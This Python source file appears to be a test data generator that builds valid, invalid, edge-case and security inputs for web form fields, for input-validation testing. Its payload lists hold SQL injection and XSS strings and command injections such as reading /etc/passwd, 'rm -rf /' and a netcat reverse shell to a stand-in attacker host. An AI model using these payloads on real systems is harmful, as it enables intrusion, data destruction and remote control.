"""
TestAI Agent - Intelligent Test Data Generator

Generates realistic, context-aware test data for different input types.
Produces both valid and invalid data for comprehensive testing.

Features:
- Type-aware generation (email, password, phone, credit card, etc.)
- Locale support (US, UK, EU formats)
- Edge case data (boundary values, special characters)
- Injection payloads (SQL, XSS, command injection)
- Realistic fake data (names, addresses, etc.)
"""

import random
import string
import re
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional
from enum import Enum
from datetime import datetime, timedelta


class DataCategory(Enum):
    """Categories of test data."""
    VALID = "valid"           # Normal valid input
    INVALID = "invalid"       # Invalid format
    EDGE_CASE = "edge_case"   # Boundary conditions
    SECURITY = "security"     # Injection/attack payloads
    EMPTY = "empty"           # Empty/null values


class InputType(Enum):
    """Types of input fields."""
    EMAIL = "email"
    PASSWORD = "password"
    USERNAME = "username"
    NAME = "name"
    PHONE = "phone"
    ADDRESS = "address"
    CITY = "city"
    STATE = "state"
    ZIP = "zip"
    COUNTRY = "country"
    CREDIT_CARD = "credit_card"
    CVV = "cvv"
    EXPIRY = "expiry"
    DATE = "date"
    NUMBER = "number"
    CURRENCY = "currency"
    URL = "url"
    TEXT = "text"
    SEARCH = "search"


@dataclass
class TestDataItem:
    """A single piece of test data."""
    value: str
    category: DataCategory
    description: str
    expected_valid: bool
    notes: Optional[str] = None


@dataclass
class TestDataSet:
    """A complete set of test data for a field type."""
    field_type: InputType
    items: List[TestDataItem] = field(default_factory=list)

    def get_valid(self) -> List[TestDataItem]:
        """Get all valid data items."""
        return [i for i in self.items if i.category == DataCategory.VALID]

    def get_invalid(self) -> List[TestDataItem]:
        """Get all invalid data items."""
        return [i for i in self.items if i.category == DataCategory.INVALID]

    def get_edge_cases(self) -> List[TestDataItem]:
        """Get edge case data items."""
        return [i for i in self.items if i.category == DataCategory.EDGE_CASE]

    def get_security(self) -> List[TestDataItem]:
        """Get security test data items."""
        return [i for i in self.items if i.category == DataCategory.SECURITY]


class TestDataGenerator:
    """
    Intelligent test data generator.

    Generates comprehensive test data for different input types,
    including valid inputs, invalid formats, edge cases, and security payloads.

    Usage:
        generator = TestDataGenerator()

        # Get email test data
        email_data = generator.generate(InputType.EMAIL)
        for item in email_data.items:
            print(f"{item.value} - {item.description}")

        # Get all test data for a form
        form_data = generator.generate_for_form({
            "email": InputType.EMAIL,
            "password": InputType.PASSWORD,
            "name": InputType.NAME,
        })
    """

    # First names for generating realistic data
    FIRST_NAMES = [
        "James", "Mary", "John", "Patricia", "Robert", "Jennifer",
        "Michael", "Linda", "David", "Elizabeth", "William", "Barbara",
        "Emma", "Liam", "Olivia", "Noah", "Ava", "Sophia",
    ]

    # Last names
    LAST_NAMES = [
        "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
        "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez",
        "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson",
    ]

    # Common email domains
    EMAIL_DOMAINS = [
        "gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
        "example.com", "test.com", "company.org",
    ]

    # SQL injection payloads
    SQL_INJECTIONS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1; SELECT * FROM users",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "'; INSERT INTO users VALUES('hacked')--",
    ]

    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
    ]

    # Command injection payloads
    CMD_INJECTIONS = [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "; rm -rf /",
        "| nc -e /bin/bash attacker.com 1234",
    ]

    def __init__(self, locale: str = "US"):
        """
        Initialize generator.

        Args:
            locale: Locale for formatting (US, UK, EU)
        """
        self.locale = locale

    def _random_string(self, length: int, charset: str = None) -> str:
        """Generate random string."""
        if charset is None:
            charset = string.ascii_letters + string.digits
        return ''.join(random.choice(charset) for _ in range(length))

    def _random_email(self, valid: bool = True) -> str:
        """Generate random email."""
        if valid:
            name = random.choice(self.FIRST_NAMES).lower()
            num = random.randint(1, 999)
            domain = random.choice(self.EMAIL_DOMAINS)
            return f"{name}{num}@{domain}"
        else:
            # Invalid formats
            invalids = [
                "notanemail",
                "@missing.com",
                "no@domain",
                "spaces in@email.com",
                "missing@.com",
            ]
            return random.choice(invalids)

    def _random_phone(self, valid: bool = True) -> str:
        """Generate random phone number."""
        if valid:
            if self.locale == "US":
                area = random.randint(200, 999)
                prefix = random.randint(200, 999)
                line = random.randint(1000, 9999)
                formats = [
                    f"({area}) {prefix}-{line}",
                    f"{area}-{prefix}-{line}",
                    f"{area}{prefix}{line}",
                    f"+1{area}{prefix}{line}",
                ]
                return random.choice(formats)
            return f"+{random.randint(1, 99)}{random.randint(100000000, 999999999)}"
        else:
            return random.choice([
                "123",  # Too short
                "abc-def-ghij",  # Letters
                "1234567890123456",  # Too long
            ])

    def _random_credit_card(self, valid: bool = True) -> str:
        """Generate random credit card number."""
        if valid:
            # Generate valid-looking card numbers (not real)
            prefixes = {
                "visa": "4",
                "mastercard": "5" + str(random.randint(1, 5)),
                "amex": "3" + random.choice(["4", "7"]),
                "discover": "6011",
            }
            card_type = random.choice(list(prefixes.keys()))
            prefix = prefixes[card_type]
            length = 15 if card_type == "amex" else 16

            # Generate rest of digits
            remaining = length - len(prefix)
            number = prefix + ''.join(str(random.randint(0, 9)) for _ in range(remaining))

            # Format
            if card_type == "amex":
                return f"{number[:4]} {number[4:10]} {number[10:]}"
            return f"{number[:4]} {number[4:8]} {number[8:12]} {number[12:]}"

        return random.choice([
            "1234",  # Too short
            "abcd efgh ijkl mnop",  # Letters
            "9999 9999 9999 9999",  # Invalid prefix
        ])

    def generate(self, input_type: InputType) -> TestDataSet:
        """
        Generate test data for a specific input type.

        Args:
            input_type: Type of input field

        Returns:
            TestDataSet with comprehensive test data
        """
        generators = {
            InputType.EMAIL: self._generate_email_data,
            InputType.PASSWORD: self._generate_password_data,
            InputType.USERNAME: self._generate_username_data,
            InputType.NAME: self._generate_name_data,
            InputType.PHONE: self._generate_phone_data,
            InputType.CREDIT_CARD: self._generate_credit_card_data,
            InputType.CVV: self._generate_cvv_data,
            InputType.EXPIRY: self._generate_expiry_data,
            InputType.DATE: self._generate_date_data,
            InputType.NUMBER: self._generate_number_data,
            InputType.URL: self._generate_url_data,
            InputType.TEXT: self._generate_text_data,
            InputType.SEARCH: self._generate_search_data,
            InputType.ADDRESS: self._generate_address_data,
            InputType.ZIP: self._generate_zip_data,
        }

        generator = generators.get(input_type, self._generate_text_data)
        return generator()

    def _generate_email_data(self) -> TestDataSet:
        """Generate email test data."""
        items = [
            # Valid
            TestDataItem("user@example.com", DataCategory.VALID, "Standard email format", True),
            TestDataItem("user.name@example.com", DataCategory.VALID, "Email with dot", True),
            TestDataItem("user+tag@example.com", DataCategory.VALID, "Email with plus", True),
            TestDataItem("user@subdomain.example.com", DataCategory.VALID, "Subdomain email", True),
            TestDataItem(self._random_email(True), DataCategory.VALID, "Random valid email", True),

            # Invalid
            TestDataItem("notanemail", DataCategory.INVALID, "Missing @ symbol", False),
            TestDataItem("@example.com", DataCategory.INVALID, "Missing local part", False),
            TestDataItem("user@", DataCategory.INVALID, "Missing domain", False),
            TestDataItem("user@.com", DataCategory.INVALID, "Missing domain name", False),
            TestDataItem("user name@example.com", DataCategory.INVALID, "Space in email", False),
            TestDataItem("user@@example.com", DataCategory.INVALID, "Double @", False),

            # Edge cases
            TestDataItem("a@b.co", DataCategory.EDGE_CASE, "Minimal valid email", True),
            TestDataItem("a" * 64 + "@example.com", DataCategory.EDGE_CASE, "Max local part (64 chars)", True),
            TestDataItem("a" * 65 + "@example.com", DataCategory.EDGE_CASE, "Over max local part", False),
            TestDataItem("user@" + "a" * 63 + ".com", DataCategory.EDGE_CASE, "Long domain label", True),

            # Empty
            TestDataItem("", DataCategory.EMPTY, "Empty email", False),
            TestDataItem("   ", DataCategory.EMPTY, "Whitespace only", False),

            # Security
            TestDataItem(self.SQL_INJECTIONS[0] + "@test.com", DataCategory.SECURITY, "SQL injection in email", False, "Check sanitization"),
            TestDataItem("<script>alert('xss')</script>@test.com", DataCategory.SECURITY, "XSS in email", False),
        ]

        return TestDataSet(field_type=InputType.EMAIL, items=items)

    def _generate_password_data(self) -> TestDataSet:
        """Generate password test data."""
        items = [
            # Valid
            TestDataItem("SecurePass123!", DataCategory.VALID, "Strong password", True),
            TestDataItem("MyP@ssw0rd", DataCategory.VALID, "Complex password", True),
            TestDataItem("Abcdefgh1!", DataCategory.VALID, "Meets requirements", True),

            # Invalid
            TestDataItem("short", DataCategory.INVALID, "Too short", False),
            TestDataItem("nouppercase1!", DataCategory.INVALID, "No uppercase", False, "If required"),
            TestDataItem("NOLOWERCASE1!", DataCategory.INVALID, "No lowercase", False, "If required"),
            TestDataItem("NoNumbers!!", DataCategory.INVALID, "No numbers", False, "If required"),
            TestDataItem("NoSpecial123", DataCategory.INVALID, "No special chars", False, "If required"),

            # Edge cases
            TestDataItem("A" * 8 + "1!", DataCategory.EDGE_CASE, "Minimum length", True),
            TestDataItem("A" * 128 + "1!", DataCategory.EDGE_CASE, "Max length", True, "Check max limit"),
            TestDataItem("A" * 256 + "1!", DataCategory.EDGE_CASE, "Over max length", False),
            TestDataItem("password", DataCategory.EDGE_CASE, "Common password", False, "Should be rejected"),
            TestDataItem("123456", DataCategory.EDGE_CASE, "Common weak password", False),
            TestDataItem("qwerty", DataCategory.EDGE_CASE, "Keyboard pattern", False),

            # Empty
            TestDataItem("", DataCategory.EMPTY, "Empty password", False),

            # Security
            TestDataItem("Pass<script>alert(1)</script>", DataCategory.SECURITY, "XSS in password", True, "Check escaping on display"),
            TestDataItem("Pass' OR '1'='1", DataCategory.SECURITY, "SQL in password", True, "Should be hashed anyway"),
        ]

        return TestDataSet(field_type=InputType.PASSWORD, items=items)

    def _generate_username_data(self) -> TestDataSet:
        """Generate username test data."""
        items = [
            TestDataItem("johndoe", DataCategory.VALID, "Standard username", True),
            TestDataItem("john_doe", DataCategory.VALID, "Username with underscore", True),
            TestDataItem("john.doe", DataCategory.VALID, "Username with dot", True),
            TestDataItem("john123", DataCategory.VALID, "Username with numbers", True),

            TestDataItem("ab", DataCategory.INVALID, "Too short", False),
            TestDataItem("a" * 51, DataCategory.INVALID, "Too long", False),
            TestDataItem("john doe", DataCategory.INVALID, "Space in username", False),
            TestDataItem("john@doe", DataCategory.INVALID, "Special char @", False),

            TestDataItem("abc", DataCategory.EDGE_CASE, "Minimum length (3)", True),
            TestDataItem("a" * 30, DataCategory.EDGE_CASE, "Max length", True),
            TestDataItem("admin", DataCategory.EDGE_CASE, "Reserved word", False, "May be blocked"),
            TestDataItem("root", DataCategory.EDGE_CASE, "Reserved word", False),

            TestDataItem("", DataCategory.EMPTY, "Empty username", False),

            TestDataItem("admin'--", DataCategory.SECURITY, "SQL injection", False),
            TestDataItem("<script>", DataCategory.SECURITY, "XSS attempt", False),
        ]

        return TestDataSet(field_type=InputType.USERNAME, items=items)

    def _generate_name_data(self) -> TestDataSet:
        """Generate name test data."""
        items = [
            TestDataItem("John Smith", DataCategory.VALID, "Standard name", True),
            TestDataItem("Mary Jane Watson", DataCategory.VALID, "Name with middle", True),
            TestDataItem("O'Brien", DataCategory.VALID, "Irish name with apostrophe", True),
            TestDataItem("Garcia-Martinez", DataCategory.VALID, "Hyphenated name", True),
            TestDataItem("Jose", DataCategory.VALID, "Single name", True, "If allowed"),

            TestDataItem("John123", DataCategory.INVALID, "Numbers in name", False),
            TestDataItem("", DataCategory.EMPTY, "Empty name", False),

            TestDataItem("J", DataCategory.EDGE_CASE, "Single letter", True, "May be valid"),
            TestDataItem("A" * 100, DataCategory.EDGE_CASE, "Very long name", True, "Check max"),
            TestDataItem("李明", DataCategory.EDGE_CASE, "Chinese characters", True, "Unicode support"),
            TestDataItem("Müller", DataCategory.EDGE_CASE, "German umlaut", True),
            TestDataItem("Αλέξανδρος", DataCategory.EDGE_CASE, "Greek name", True),

            TestDataItem("<script>alert(1)</script>", DataCategory.SECURITY, "XSS in name", False),
            TestDataItem("Robert'); DROP TABLE users;--", DataCategory.SECURITY, "SQL injection", False),
        ]

        return TestDataSet(field_type=InputType.NAME, items=items)

    def _generate_phone_data(self) -> TestDataSet:
        """Generate phone test data."""
        items = [
            TestDataItem("(555) 123-4567", DataCategory.VALID, "US format with parentheses", True),
            TestDataItem("555-123-4567", DataCategory.VALID, "US format with dashes", True),
            TestDataItem("5551234567", DataCategory.VALID, "US format no formatting", True),
            TestDataItem("+1 555 123 4567", DataCategory.VALID, "International format", True),
            TestDataItem("+44 20 7123 4567", DataCategory.VALID, "UK format", True),

            TestDataItem("123", DataCategory.INVALID, "Too short", False),
            TestDataItem("abcdefghij", DataCategory.INVALID, "Letters instead of numbers", False),
            TestDataItem("555-ABC-DEFG", DataCategory.INVALID, "Letters in phone", False),

            TestDataItem("0000000000", DataCategory.EDGE_CASE, "All zeros", True, "May be invalid"),
            TestDataItem("9999999999", DataCategory.EDGE_CASE, "All nines", True),
            TestDataItem("+0 000 000 0000", DataCategory.EDGE_CASE, "Invalid country code", False),

            TestDataItem("", DataCategory.EMPTY, "Empty phone", False),

            TestDataItem("555-123-4567; ls -la", DataCategory.SECURITY, "Command injection", False),
        ]

        return TestDataSet(field_type=InputType.PHONE, items=items)

    def _generate_credit_card_data(self) -> TestDataSet:
        """Generate credit card test data."""
        items = [
            TestDataItem("4111 1111 1111 1111", DataCategory.VALID, "Test Visa", True),
            TestDataItem("5500 0000 0000 0004", DataCategory.VALID, "Test Mastercard", True),
            TestDataItem("3400 0000 0000 009", DataCategory.VALID, "Test Amex", True),
            TestDataItem("6011 0000 0000 0004", DataCategory.VALID, "Test Discover", True),

            TestDataItem("1234 5678 9012 3456", DataCategory.INVALID, "Invalid prefix", False),
            TestDataItem("4111 1111 1111", DataCategory.INVALID, "Too short", False),
            TestDataItem("AAAA BBBB CCCC DDDD", DataCategory.INVALID, "Letters", False),

            TestDataItem("0000 0000 0000 0000", DataCategory.EDGE_CASE, "All zeros", False),

            TestDataItem("", DataCategory.EMPTY, "Empty card", False),

            TestDataItem("4111'--1111 1111 1111", DataCategory.SECURITY, "SQL injection", False),
        ]

        return TestDataSet(field_type=InputType.CREDIT_CARD, items=items)

    def _generate_cvv_data(self) -> TestDataSet:
        """Generate CVV test data."""
        items = [
            TestDataItem("123", DataCategory.VALID, "3-digit CVV", True),
            TestDataItem("1234", DataCategory.VALID, "4-digit CVV (Amex)", True),

            TestDataItem("12", DataCategory.INVALID, "Too short", False),
            TestDataItem("12345", DataCategory.INVALID, "Too long", False),
            TestDataItem("ABC", DataCategory.INVALID, "Letters", False),

            TestDataItem("000", DataCategory.EDGE_CASE, "All zeros", True),
            TestDataItem("999", DataCategory.EDGE_CASE, "All nines", True),

            TestDataItem("", DataCategory.EMPTY, "Empty CVV", False),
        ]

        return TestDataSet(field_type=InputType.CVV, items=items)

    def _generate_expiry_data(self) -> TestDataSet:
        """Generate card expiry test data."""
        now = datetime.now()
        future = now + timedelta(days=365)
        past = now - timedelta(days=365)

        items = [
            TestDataItem(future.strftime("%m/%y"), DataCategory.VALID, "Future date", True),
            TestDataItem(f"{now.month:02d}/{(now.year + 5) % 100:02d}", DataCategory.VALID, "5 years future", True),

            TestDataItem(past.strftime("%m/%y"), DataCategory.INVALID, "Expired card", False),
            TestDataItem("13/25", DataCategory.INVALID, "Invalid month", False),
            TestDataItem("00/25", DataCategory.INVALID, "Invalid month (00)", False),

            TestDataItem(f"{now.month:02d}/{now.year % 100:02d}", DataCategory.EDGE_CASE, "Current month", True),

            TestDataItem("", DataCategory.EMPTY, "Empty expiry", False),
        ]

        return TestDataSet(field_type=InputType.EXPIRY, items=items)

    def _generate_date_data(self) -> TestDataSet:
        """Generate date test data."""
        now = datetime.now()

        items = [
            TestDataItem(now.strftime("%Y-%m-%d"), DataCategory.VALID, "ISO format", True),
            TestDataItem(now.strftime("%m/%d/%Y"), DataCategory.VALID, "US format", True),
            TestDataItem(now.strftime("%d/%m/%Y"), DataCategory.VALID, "EU format", True),

            TestDataItem("2023-13-01", DataCategory.INVALID, "Invalid month", False),
            TestDataItem("2023-02-30", DataCategory.INVALID, "Invalid day", False),
            TestDataItem("not-a-date", DataCategory.INVALID, "Text instead of date", False),

            TestDataItem("2000-01-01", DataCategory.EDGE_CASE, "Y2K date", True),
            TestDataItem("1900-01-01", DataCategory.EDGE_CASE, "Old date", True),
            TestDataItem("2099-12-31", DataCategory.EDGE_CASE, "Far future", True),
            TestDataItem("2000-02-29", DataCategory.EDGE_CASE, "Leap year", True),
            TestDataItem("2001-02-29", DataCategory.EDGE_CASE, "Invalid leap year", False),

            TestDataItem("", DataCategory.EMPTY, "Empty date", False),
        ]

        return TestDataSet(field_type=InputType.DATE, items=items)

    def _generate_number_data(self) -> TestDataSet:
        """Generate number test data."""
        items = [
            TestDataItem("42", DataCategory.VALID, "Integer", True),
            TestDataItem("3.14", DataCategory.VALID, "Decimal", True),
            TestDataItem("-100", DataCategory.VALID, "Negative", True),
            TestDataItem("0", DataCategory.VALID, "Zero", True),

            TestDataItem("abc", DataCategory.INVALID, "Text", False),
            TestDataItem("12.34.56", DataCategory.INVALID, "Multiple decimals", False),

            TestDataItem("0.0001", DataCategory.EDGE_CASE, "Very small", True),
            TestDataItem("999999999", DataCategory.EDGE_CASE, "Large number", True),
            TestDataItem("-0", DataCategory.EDGE_CASE, "Negative zero", True),

            TestDataItem("", DataCategory.EMPTY, "Empty", False),
        ]

        return TestDataSet(field_type=InputType.NUMBER, items=items)

    def _generate_url_data(self) -> TestDataSet:
        """Generate URL test data."""
        items = [
            TestDataItem("https://example.com", DataCategory.VALID, "HTTPS URL", True),
            TestDataItem("http://example.com", DataCategory.VALID, "HTTP URL", True),
            TestDataItem("https://sub.example.com/path", DataCategory.VALID, "With path", True),
            TestDataItem("https://example.com?q=test", DataCategory.VALID, "With query", True),

            TestDataItem("not-a-url", DataCategory.INVALID, "No protocol", False),
            TestDataItem("ftp://example.com", DataCategory.INVALID, "FTP protocol", False, "May be blocked"),
            TestDataItem("://example.com", DataCategory.INVALID, "Missing protocol name", False),

            TestDataItem("http://localhost", DataCategory.EDGE_CASE, "Localhost", True, "May be blocked"),
            TestDataItem("http://127.0.0.1", DataCategory.EDGE_CASE, "IP address", True),
            TestDataItem("https://example.com/" + "a" * 2000, DataCategory.EDGE_CASE, "Very long URL", True),

            TestDataItem("", DataCategory.EMPTY, "Empty URL", False),

            TestDataItem("javascript:alert(1)", DataCategory.SECURITY, "JavaScript protocol", False),
            TestDataItem("https://evil.com?redirect=<script>", DataCategory.SECURITY, "XSS in URL", False),
        ]

        return TestDataSet(field_type=InputType.URL, items=items)

    def _generate_text_data(self) -> TestDataSet:
        """Generate generic text test data."""
        items = [
            TestDataItem("Hello World", DataCategory.VALID, "Simple text", True),
            TestDataItem("Test input with numbers 123", DataCategory.VALID, "Mixed content", True),

            TestDataItem("A" * 10000, DataCategory.EDGE_CASE, "Very long text", True, "Check limits"),
            TestDataItem("😀🎉🚀", DataCategory.EDGE_CASE, "Emoji", True),
            TestDataItem("مرحبا", DataCategory.EDGE_CASE, "Arabic (RTL)", True),
            TestDataItem("   trimmed   ", DataCategory.EDGE_CASE, "Whitespace", True),

            TestDataItem("", DataCategory.EMPTY, "Empty text", False, "If required"),

            TestDataItem(self.XSS_PAYLOADS[0], DataCategory.SECURITY, "XSS payload", True, "Should be escaped"),
            TestDataItem(self.SQL_INJECTIONS[0], DataCategory.SECURITY, "SQL injection", True, "Should be escaped"),
        ]

        return TestDataSet(field_type=InputType.TEXT, items=items)

    def _generate_search_data(self) -> TestDataSet:
        """Generate search query test data."""
        items = [
            TestDataItem("laptop", DataCategory.VALID, "Single word", True),
            TestDataItem("red running shoes", DataCategory.VALID, "Multiple words", True),
            TestDataItem('"exact phrase"', DataCategory.VALID, "Quoted phrase", True),

            TestDataItem("", DataCategory.EMPTY, "Empty search", True, "May show all results"),

            TestDataItem("a" * 500, DataCategory.EDGE_CASE, "Very long query", True),
            TestDataItem("*", DataCategory.EDGE_CASE, "Wildcard", True),
            TestDataItem("test AND (a OR b)", DataCategory.EDGE_CASE, "Boolean operators", True),

            TestDataItem(self.SQL_INJECTIONS[0], DataCategory.SECURITY, "SQL injection", True, "Should be escaped"),
            TestDataItem(self.XSS_PAYLOADS[0], DataCategory.SECURITY, "XSS payload", True, "Should be escaped"),
        ]

        return TestDataSet(field_type=InputType.SEARCH, items=items)

    def _generate_address_data(self) -> TestDataSet:
        """Generate address test data."""
        items = [
            TestDataItem("123 Main Street", DataCategory.VALID, "Standard address", True),
            TestDataItem("456 Oak Ave, Apt 2B", DataCategory.VALID, "With apartment", True),
            TestDataItem("789 1st St NW", DataCategory.VALID, "With direction", True),

            TestDataItem("A" * 200, DataCategory.EDGE_CASE, "Very long address", True),
            TestDataItem("日本語住所", DataCategory.EDGE_CASE, "Japanese address", True),

            TestDataItem("", DataCategory.EMPTY, "Empty address", False),

            TestDataItem("123 <script>alert(1)</script> St", DataCategory.SECURITY, "XSS in address", True),
        ]

        return TestDataSet(field_type=InputType.ADDRESS, items=items)

    def _generate_zip_data(self) -> TestDataSet:
        """Generate ZIP/postal code test data."""
        items = [
            TestDataItem("12345", DataCategory.VALID, "US 5-digit", True),
            TestDataItem("12345-6789", DataCategory.VALID, "US ZIP+4", True),
            TestDataItem("SW1A 1AA", DataCategory.VALID, "UK postcode", True),

            TestDataItem("1234", DataCategory.INVALID, "Too short", False),
            TestDataItem("ABCDE", DataCategory.INVALID, "Letters only (US)", False),

            TestDataItem("00000", DataCategory.EDGE_CASE, "All zeros", True, "May be invalid"),
            TestDataItem("99999", DataCategory.EDGE_CASE, "All nines", True),

            TestDataItem("", DataCategory.EMPTY, "Empty ZIP", False),
        ]

        return TestDataSet(field_type=InputType.ZIP, items=items)

    def generate_for_form(
        self,
        fields: Dict[str, InputType],
        include_security: bool = True,
    ) -> Dict[str, TestDataSet]:
        """
        Generate test data for a complete form.

        Args:
            fields: Dict mapping field names to input types
            include_security: Include security test data

        Returns:
            Dict mapping field names to TestDataSet
        """
        result = {}
        for field_name, input_type in fields.items():
            data_set = self.generate(input_type)

            # Filter out security tests if not wanted
            if not include_security:
                data_set.items = [
                    i for i in data_set.items
                    if i.category != DataCategory.SECURITY
                ]

            result[field_name] = data_set

        return result

    def get_security_payloads(self) -> Dict[str, List[str]]:
        """Get all security test payloads."""
        return {
            "sql_injection": self.SQL_INJECTIONS,
            "xss": self.XSS_PAYLOADS,
            "command_injection": self.CMD_INJECTIONS,
        }


# Convenience function
def create_test_data_generator(locale: str = "US") -> TestDataGenerator:
    """Create a test data generator."""
    return TestDataGenerator(locale=locale)


if __name__ == "__main__":
    # Demo
    generator = create_test_data_generator()

    print("=" * 60)
    print("Test Data Generator Demo")
    print("=" * 60)

    # Email data
    print("\nEmail Test Data:")
    email_data = generator.generate(InputType.EMAIL)
    for item in email_data.items[:5]:
        status = "✓" if item.expected_valid else "✗"
        print(f"  {status} {item.value:40} - {item.description}")

    # Password data
    print("\nPassword Test Data:")
    password_data = generator.generate(InputType.PASSWORD)
    for item in password_data.items[:5]:
        status = "✓" if item.expected_valid else "✗"
        print(f"  {status} {item.value:40} - {item.description}")

    # Form data
    print("\nLogin Form Test Data:")
    form_data = generator.generate_for_form({
        "email": InputType.EMAIL,
        "password": InputType.PASSWORD,
    })
    for field, data in form_data.items():
        print(f"\n  {field}:")
        for item in data.get_valid()[:2]:
            print(f"    ✓ {item.value}")
        for item in data.get_invalid()[:2]:
            print(f"    ✗ {item.value}")
